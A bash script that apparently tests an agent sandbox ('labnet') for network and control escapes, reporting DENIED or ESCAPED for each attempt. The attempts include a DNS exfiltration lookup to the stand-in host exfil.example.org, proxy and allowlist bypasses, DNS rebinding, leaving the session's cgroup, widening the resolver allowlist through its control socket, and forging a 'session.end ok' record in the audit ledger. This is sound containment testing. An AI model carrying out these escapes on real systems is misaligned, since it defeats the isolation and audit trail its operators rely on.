#!/usr/bin/env bash
# Network escape attempts inside a labnet session (direct egress on). Each
# line prints DENIED (blocked) or ESCAPED (it worked).
try() {
  local name=$1; shift
  if timeout 15 "$@" >/tmp/a.out 2>&1; then echo "ESCAPED $name"; else echo "DENIED  $name"; fi
}
dnsq() { # dnsq PROTO HOST PORT NAME: one A query, succeeds only on an answer
  python3 - "$@" <<'PY'
import socket, struct, sys
proto, host, port, name = sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4]
q = struct.pack(">HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0)
for l in name.split("."):
    q += bytes([len(l)]) + l.encode()
q += b"\x00" + struct.pack(">HH", 1, 1)
if proto == "udp":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
    s.sendto(q, (host, port)); r = s.recv(512)
else:
    s = socket.create_connection((host, port), 3); s.settimeout(3)
    s.sendall(struct.pack(">H", len(q)) + q); r = s.recv(512)
sys.exit(0 if len(r) > 12 and struct.unpack(">H", r[6:8])[0] > 0 else 1)
PY
}
# --- unlisted names ---
try unlisted-name-proxy curl -fsS --max-time 10 -o /dev/null https://example.com
try unlisted-name-direct curl -fsS --noproxy '*' --max-time 10 -o /dev/null https://example.com
try unlisted-name-lookup getent hosts example.com
try exfil-by-dns-name getent hosts "lab-fake-secret-c2VjcmV0.exfil.example.org"
# --- addresses no allowed name resolved to ---
try ip-literal-direct curl -fsS --noproxy '*' --connect-timeout 5 -o /dev/null https://1.1.1.1
try ip-literal-proxy curl -fsS --max-time 10 -o /dev/null https://1.1.1.1
NPM_IP=$(getent ahostsv4 registry.npmjs.org | awk 'NR==1{print $1}')
try allowed-ip-other-port curl -fsS --noproxy '*' --connect-timeout 5 -o /dev/null "http://${NPM_IP:-104.16.0.34}:8443/"
# The proxy may connect to any port now; its allowlist still decides.
try allowed-name-other-port-proxy curl -fsS --max-time 10 -o /dev/null "http://registry.npmjs.org:8443/"
try private-name-unlisted-port-proxy curl -fsS --max-time 10 -o /dev/null "http://model.basalt-lab.test:22/"
try ip-literal-model-port-proxy curl -fsS --max-time 10 -o /dev/null "http://$(getent ahostsv4 model.basalt-lab.test | awk 'NR==1{print $1}'):11434/"
try lan-gateway-direct curl -fsS --noproxy '*' --connect-timeout 5 -o /dev/null "http://${LAB_GW:-10.86.0.1}:8080/"
# --- other DNS servers ---
try direct-dns-udp dnsq udp 8.8.8.8 53 example.com
try direct-dns-tcp dnsq tcp 1.1.1.1 53 example.com
try dns-over-tls python3 -c 'import socket; socket.create_connection(("1.1.1.1", 853), 5)'
try lan-dns-udp dnsq udp "${LAB_GW:-10.86.0.1}" 53 example.com
# example.net is allowed only in another running session (labnet2): its
# resolver would answer, this session's refuses; the other port is dropped.
try other-session-resolver python3 -c '
import socket, struct, sys
q = struct.pack(">HHHHHH", 0x4243, 0x0100, 1, 0, 0, 0) + b"\x07example\x03net\x00" + struct.pack(">HH", 1, 1)
for port in range(47200, 47264):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(0.15)
    try:
        s.sendto(q, ("127.0.0.1", port)); r = s.recv(512)
        if struct.unpack(">H", r[6:8])[0] > 0: sys.exit(0)
    except OSError:
        pass
sys.exit(1)'
# --- DNS rebinding: an allowed name that points at a local address ---
try rebind-lookup getent hosts rebind.basalt-lab.test
try rebind-direct curl -fsS --noproxy '*' --connect-timeout 5 -o /dev/null http://rebind.basalt-lab.test:8008/
try rebind-proxy curl -fsS --max-time 10 -o /dev/null http://rebind.basalt-lab.test:8008/
# --- leave the session's cgroup or widen it ---
try move-out-of-cgroup sh -c 'echo $$ > /sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/cgroup.procs'
try new-scope systemd-run --user --scope true
try resolver-widen python3 -c '
import socket,json
s=socket.socket(socket.AF_UNIX); s.settimeout(3); s.connect("/run/basalt-resolver/control.sock")
s.sendall(json.dumps({"op":"allow","session":"x","entry":"example.com"}).encode()+b"\n")
import sys; sys.exit(0 if b"\"ok\":true" in s.recv(4096) else 1)'
# --- the ledger ---
try ledger-append python3 -c '
import socket,json
s=socket.socket(socket.AF_UNIX); s.settimeout(3); s.connect("/run/basalt-ledger/ledger.sock")
s.sendall(json.dumps({"op":"append","record":{"v":1,"producer":"basalt-agent","event":"session.end","outcome":"ok"}}).encode()+b"\n")
import sys; sys.exit(0 if b"\"ok\":true" in s.recv(4096) else 1)'
try ledger-read-files cat /var/log/basalt-ledger/ledger.jsonl
